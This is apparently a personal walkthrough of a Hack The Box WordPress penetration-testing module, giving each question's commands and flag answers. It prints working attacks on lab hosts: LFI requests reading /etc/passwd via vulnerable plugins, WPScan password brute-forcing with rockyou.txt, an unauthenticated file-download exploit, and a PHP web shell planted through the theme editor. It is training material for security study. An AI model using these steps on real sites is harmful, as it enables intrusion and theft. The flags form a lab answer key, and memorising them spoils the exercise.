@@ -1,0 +1,422 @@
+[Directory Indexing]
+
+[*] Target: 165.232.46.252:31779/wp-content/plugins/mail-masta/
+
+[Question 1] Keep in mind the key WordPress directories discussed in the WordPress Structure section. Manually enumerate the target for any directories whose contents can be listed
+             Browse these directories and locate a flag with the file name flag.txt and submit its contents as the answer.
+
+- After installation, all WordPress supporting files and directories will be accessible in the webroot located at /var/www/html (we will focus on a default WordPress installation on an Ubuntu Linux web server)
+
+    BigBoxVPS@htb[/htb]$ tree -L 1 /var/www/html
+
+    ├── index.php => is the homepage of WordPress.
+    ├── license.txt => contains useful information such as the version WordPress installed.
+    ├── readme.html
+    ├── wp-activate.php => is used for the email activation process when setting up a new WordPress site
+    ├── wp-admin
+    │   ├── login.php (or just wp-login.php not /wp-admin/login.php)
+    ├── wp-login.php
+    ├── wp-blog-header.php
+    ├── wp-comments-post.php
+    ├── wp-config.php => contains information required by WordPress to connect to the database, such as the database name, database host, username, and password
+    ├── wp-config-sample.php
+    ├── wp-content => folder is the main directory where plugins and themes are stored. The subdirectory uploads/ is usually where any files uploaded to the platform are stored
+    │   ├── index.php
+    │   ├── plugins
+    ├── wp-cron.php
+    ├── wp-includes =>  contains everything except for the administrative components and the themes that belong to the website
+    ├── wp-links-opml.php
+    ├── wp-load.php
+    ├── wp-login.php
+    ├── wp-mail.php
+    ├── wp-settings.php
+    ├── wp-signup.php
+    ├── wp-trackback.php
+    └── xmlrpc.php => representing a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism
+
+    # curl http://165.232.46.252:31779/wp-content/plugins/mail-masta/inc/flag.txt => HTB{3num3r4t10n_15_k3y}    
+
+    [!] Answer: "HTB{3num3r4t10n_15_k3y}"      
+
+
+[Login]
+
+[*] Target: 165.232.46.252:31779
+
+[Question 1]  Search for "WordPress xmlrpc attacks" and find out how to use it to execute all method calls. Enter the number of possible method calls of your target as the answer.
+
+    - You might have seen a /xmlrpc.php file in many wordpress sites you visit, you might have even tried to search the error(XML-RPC server accepts POST requests only)
+
+    => Yeah now we will exploit it together
+
+        GET /xmlrpc.php HTTP/1.1
+        Host: 165.232.46.252:31779
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+        => XML-RPC server accepts POST requests only.
+
+    => Right-click and "Change request method", and add a few lines of XML code to read all the methods
+
+        POST /xmlrpc.php HTTP/1.1
+        Host: 165.232.46.252:31779
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 0
+
+        <methodCall>
+        <methodName>system.listMethods</methodName>
+        <params></params>
+        </methodCall>
+
+    => You can see 80 different methods in the response
+
+    [!] Answer: "80"
+
+
+[WPScan Enumeration]
+
+[*] Target: 178.62.18.68:30201
+
+[Question 1] Enumerate the provided WordPress instance for all installed plugins. Perform a scan with WPScan against the target and submit the version of the vulnerable plugin named 'photo-gallery'.
+
+    - After registering a WPscan account I had my API, you guy should create at least 2 accounts because each one only gives you 25 scans per day
+
+        # wpscan --url http://178.62.18.68:30201/ --enumerate --api-token <My API token>
+
+            [?] --output <filename>
+
+            [?] --enumerate:  used to enumerate various components of the WordPress application such as plugins, themes, and users
+        _______________________________________________________________
+                __          _______   _____
+                \ \        / /  __ \ / ____|
+                 \ \  /\  / /| |__) | (___   ___  __ _ _ __ 
+                  \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_  ]
+                   \  /\  /  | |     ____) | (__| (_| | | | |
+                    \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+                WordPress Security Scanner by the WPScan Team
+                                Version 3.8.24
+                                    
+            @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+        _______________________________________________________________
+
+        [i] Updating the Database ...
+        [i] Update completed.
+
+        [+] URL: http://178.62.18.68:30201/ [178.62.18.68]
+        [+] Started: Tue Jun 13 04:31:02 2023
+
+        Interesting Finding(s):
+        ...
+        [+] photo-gallery
+        | Location: http://178.62.18.68:30201/wp-content/plugins/photo-gallery/
+        | Last Updated: 2023-06-02T15:32:00.000Z
+        | [!] The version is out of date, the latest version is 1.8.16
+        |
+        | Found By: Urls In Homepage (Passive Detection)
+        | Confirmed By: Urls In 404 Page (Passive Detection)
+        |
+        | [!] 17 vulnerabilities identified:
+        ...
+        | Version: 1.5.34 (100% confidence)
+        | Found By: Query Parameter (Passive Detection)
+        |  - http://178.62.18.68:30201/wp-content/plugins/photo-gallery/css/jquery.mCustomScrollbar.min.css?ver=1.5.34
+        |  - http://178.62.18.68:30201/wp-content/plugins/photo-gallery/css/styles.min.css?ver=1.5.34
+        |  - http://178.62.18.68:30201/wp-content/plugins/photo-gallery/js/jquery.mCustomScrollbar.concat.min.js?ver=1.5.34
+        |  - http://178.62.18.68:30201/wp-content/plugins/photo-gallery/js/scripts.min.js?ver=1.5.34
+        | Confirmed By:
+        |  Readme - Stable Tag (Aggressive Detection)
+        |   - http://178.62.18.68:30201/wp-content/plugins/photo-gallery/readme.txt
+        |  Readme - ChangeLog Section (Aggressive Detection)
+        |   - http://178.62.18.68:30201/wp-content/plugins/photo-gallery/readme.txt
+        ...
+
+    [Note] I already saved the output, name "wpscan_1.txt", use it if somehow you can't use this tool
+
+    [!] Answer: "1.5.34"
+
+
+[Exploiting a Vulnerable Plugin]
+
+[*] Target: 178.62.18.68:30938
+
+[Question 1] Use the same LFI vulnerability against your target and read the contents of the "/etc/passwd" file. Locate the only non-root user on the system with a login shell.
+
+    - The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanism implemented in the target application
+
+    => The vulnerability occurs due to the use of user-supplied input without proper validation.
+
+        Source: /inc/campaign/count_of_send.php
+        Line 4: include($_GET['pl']);
+
+        Source: /inc/lists/csvexport.php:
+        Line 5: include($_GET['pl']);
+
+        Source: /inc/campaign/count_of_send.php
+        Line 4: include($_GET['pl']);
+
+        Source: /inc/lists/csvexport.php
+        Line 5: include($_GET['pl']);
+
+        Source: /inc/campaign/count_of_send.php
+        Line 4: include($_GET['pl']);
+
+    => You can go to the http://178.62.18.68:30938/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/etc/passwd => ... /home/sally.jones:/bin/bash
+
+    [!] Answer: "sally.jones
+
+
+[Attacking WordPress Users]
+
+[*] Target: 178.62.18.68:30460 (same machine with 178.62.18.68:30201)
+
+[Question 1] Perform a brute force attack against the user "roger" on your target with the wordlist "rockyou.txt". Submit the user's password as the answer.
+
+    - So in the result of the previous scan, we gathered 3 users:
+
+        [+] admin
+        | Found By: Author Posts - Author Pattern (Passive Detection)
+        | Confirmed By:
+        |  Rss Generator (Passive Detection)
+        |  Wp Json Api (Aggressive Detection)
+        |   - http://178.62.18.68:30201/wp-json/wp/v2/users/?per_page=100&page=1
+        |  Rss Generator (Aggressive Detection)
+        |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+        |  Login Error Messages (Aggressive Detection)
+
+        [+] roger
+        | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+        | Confirmed By: Login Error Messages (Aggressive Detection)
+
+        [+] david
+        | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+        | Confirmed By: Login Error Messages (Aggressive Detection)
+
+    # wpscan --password-attack xmlrpc -t 20 -U roger -P /usr/share/wordlists/rockyou.txt --url http://178.62.18.68:30460 => [SUCCESS] - roger / lizard
+
+    [!] Answer: "lizard"
+
+
+[Remote Code Execution (RCE) via the Theme Editor]
+
+[*] Target: 178.62.18.68:30460
+
+[Question 1] Use the credentials for the admin user [admin:sunshine1] and upload a webshell to your target
+             Once you have access to the target, obtain the contents of the "flag.txt" file in the home directory for the "wp-user" directory.
+
+    - Remember the wordpress structure I gave you, with that you can easily find http://178.62.18.68:30460/wp-login.php, login with the given credential and you have your WP controller
+
+    - Go to the Theme Editor >> Now, you should look for any ".php" file (I myself chose http://178.62.18.68:30460/wp-admin/theme-editor.php?file=comments.php&theme=ben_theme)
+
+    => Change its content to "<?php system($_GET['cmd']);?>"
+
+    => http://178.62.18.68:30460/wp-content/themes/ben_theme/comments.php?cmd=cat%20/home/wp-user/flag.txt => HTB{rc3_By_d3s1gn}
+
+    [!] Answer: "HTB{rc3_By_d3s1gn}"
+
+
+[Skills Assessment - WordPress]
+
+[*] Target: 10.129.199.131
+
+[Question 1] Identify the WordPress version number.
+
+    - Now we need to find the WordPress version number right => wpscan --url http://10.129.199.131/ --enumerate --api-token <My API token>
+
+                __          _______   _____
+                \ \        / /  __ \ / ____|
+                 \ \  /\  / /| |__) | (___   ___  __ _ _ __ 
+                  \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+                   \  /\  /  | |     ____) | (__| (_| | | | |
+                    \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+                WordPress Security Scanner by the WPScan Team
+                                Version 3.8.24
+            Sponsored by Automattic - https://automattic.com/
+            @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+        _______________________________________________________________
+
+
+        Scan Aborted: The remote website is up, but does not seem to be running WordPress.
+
+    "You have been contracted to perform an external penetration test against the company INLANEFREIGHT that is hosting one of their main public-facing websites on WordPress."
+
+    - Sorry I didn't read this carefully =))
+
+    => I just read the page source code and Voila <li class=""><a href="http://blog.inlanefreight.local">Blog</a></li>
+
+    => # cat /etc/hosts
+
+        127.0.0.1       localhost
+        127.0.1.1       kali
+        10.129.2.37     blog.inlanefreight.local
+        10.129.2.37     inlanefreight.local
+        # The following lines are desirable for IPv6 capable hosts
+        ::1     localhost ip6-localhost ip6-loopback
+        ff02::1 ip6-allnodes
+        ff02::2 ip6-allrouters
+
+    => wpscan --url http://blog.inlanefreight.local/ --enumerate -U /usr/share/eaphammer/wordlists/rockyou.txt --api-token <My API token> -t 10
+
+    [Note] I already save the result in wpscan_2.txt, you can see it for more detail, here, I just show the main points oke
+
+    ...
+    [+] WordPress version 5.1.6 identified (Insecure, released on 2020-06-10).
+    | Found By: Rss Generator (Passive Detection)
+    |  - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
+    |  - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.1.6</generator>    
+    ...
+    
+    [!] Answer: "5.1.6"
+
+[Question 2] Identify the WordPress theme in use.
+
+    ...
+    [+] WordPress theme in use: twentynineteen
+    | Location: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/
+    | Last Updated: 2023-03-29T00:00:00.000Z
+    | Readme: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/readme.txt
+    | [33m[!] The version is out of date, the latest version is 2.5
+    | Style URL: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3
+    | Style Name: Twenty Nineteen
+    | Style URI: https://github.com/WordPress/twentynineteen
+    | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
+    | Author: the WordPress team
+    | Author URI: https://wordpress.org/
+    ...
+    
+    [!] Answer: "twentynineteen"
+
+[Question 3] Submit the contents of the flag file in the directory with directory listing enabled.
+
+    ...
+    [+] WordPress readme found: http://blog.inlanefreight.local/readme.html
+    | Found By: Direct Access (Aggressive Detection)
+    | Confidence: 100%
+
+    [+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/
+    | Found By: Direct Access (Aggressive Detection)
+    | Confidence: 100%
+
+    [+] The external WP-Cron seems to be enabled: http://blog.inlanefreight.local/wp-cron.php
+    | Found By: Direct Access (Aggressive Detection)
+    | Confidence: 60%
+    | References:
+    |  - https://www.iplocation.net/defend-wordpress-from-ddos
+    |  - https://github.com/wpscanteam/wpscan/issues/1299
+    ...
+
+    => http://blog.inlanefreight.local/wp-content/uploads/upload_flag.txt => HTB{d1sabl3_d1r3ct0ry_l1st1ng!}
+
+    [!] Answer: "HTB{d1sabl3_d1r3ct0ry_l1st1ng!}"
+
+[Question 4] Identify the only non-admin WordPress user. (Format: <first-name> <last-name>)
+
+    [i] User(s) Identified:
+
+    [+] erika
+    | Found By: Author Posts - Display Name (Passive Detection)
+    | Confirmed By:
+    |  Rss Generator (Passive Detection)
+    |  Author Id Brute Forcing - Display Name (Aggressive Detection)
+    |  Login Error Messages (Aggressive Detection)
+
+    [+] admin
+    | Found By: Author Posts - Display Name (Passive Detection)
+    | Confirmed By:
+    |  Rss Generator (Passive Detection)
+    |  Author Id Brute Forcing - Display Name (Aggressive Detection)
+    |  Login Error Messages (Aggressive Detection)
+
+    [+] Charlie Wiggins
+    | Found By: Author Id Brute Forcing - Display Name (Aggressive Detection)
+
+    [!] Answer: "Charlie Wiggins"
+
+[Question 5]  Use a vulnerable plugin to download a file containing a flag value via an unauthenticated file download. 
+
+    - You need to search for "wordpress vulnerable plugin to download a file containing a flag value via an unauthenticated file download"
+
+        => https://www.exploit-db.com/exploits/48698
+
+    => curl [BASE_URL]'/wp-admin/admin.php?page=download_report&report=users&status=all'
+    EXAMPLE: curl 'http://127.0.0.1/wp-admin/admin.php?page=download_report&report=users&status=all'
+
+    => If you go to http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all => all-contacts.csv is automatically downloaded
+
+    =>  "First Name", "Last Name", "Email", "List", "Status", "Opt-In Type", "Created On"
+        "admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", "admin@inlanefreight.local", "Test", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"
+        "admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", "admin@inlanefreight.local", "Main", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"
+
+    [!] Answer: "HTB{unauTh_d0wn10ad!}"
+
+[Question 6] What is the version number of the plugin vulnerable to an LFI?
+
+    - You need to search for "wordpress version number of the plugin vulnerable to an LFI"
+
+        => https://www.exploit-db.com/exploits/44340
+
+    ** CVE description **
+    A Local File Inclusion vulnerability in the Site Editor plugin through 1.1.1 for WordPress allows remote attackers to retrieve arbitrary files via the ajax_path parameter to editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php. 
+
+    ** Proof of Concept **
+    http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+
+    [!] Anwer: "1.1.1"
+
+[Question 7] Use the LFI to identify a system user whose name starts with the letter "f".
+
+    [+] site-editor
+    | Location: http://blog.inlanefreight.local/wp-content/plugins/site-editor/
+    | Latest Version: 1.1.1 (up to date)
+    | Last Updated: 2017-05-02T23:34:00.000Z
+    |
+    | Found By: Urls In Homepage (Passive Detection)
+    |
+    | [!] 1 vulnerability identified:
+    |
+    | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
+    |     References:
+    |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
+    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
+    |      - https://seclists.org/fulldisclosure/2018/Mar/40
+    |      - https://github.com/SiteEditor/editor/issues/2
+    |
+    | Version: 1.1.1 (80% confidence)
+    | Found By: Readme - Stable Tag (Aggressive Detection)
+    |  - http://blog.inlanefreight.local/wp-content/plugins/site-editor/readme.txt
+
+    => "A Local File Inclusion vulnerability in the Site Editor plugin through 1.1.1 for WordPress allows remote ..." =))
+
+    => http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+
+    => ::/home/erika:/bin/bash frank.mclane:x:1002:1002
+       ::/home/frank.mclane:/bin/bash {"success":true,"data":{"output":[]}}
+
+    [!] Answer: "frank.mclane"
+
+[Question 7] Obtain a shell on the system and submit the contents of the flag in the /home/erika directory
+
+    - So anyway we need to find the password of any user to access to the wordpress controller (http://blog.inlanefreight.local/wp-login.php)
+
+    => wpscan --password-attack xmlrpc -t 20 -U erika -P usr/share/eaphammer/wordlists/rockyou.txt --url http://blog.inlanefreight.com => [SUCCESS] - erika / 010203
+
+    - Go to the Appearance >> Theme Editor >> Now, you should look for any ".php" file (I myself chose http://blog.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentysixteen)
+
+    => Change its content to "<?php system($_GET['cmd']);?>"
+
+    => http://blog.inlanefreight.local/wp-content/themes/twentysixteen/404.php?cmd=ls%20/home/erika => d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt
+
+    => http://blog.inlanefreight.local/wp-content/themes/twentysixteen/404.php?cmd=cat%20/home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt => HTB{w0rdPr355_4SS3ssm3n7}
+
+    [!] Answer: "HTB{w0rdPr355_4SS3ssm3n7}"
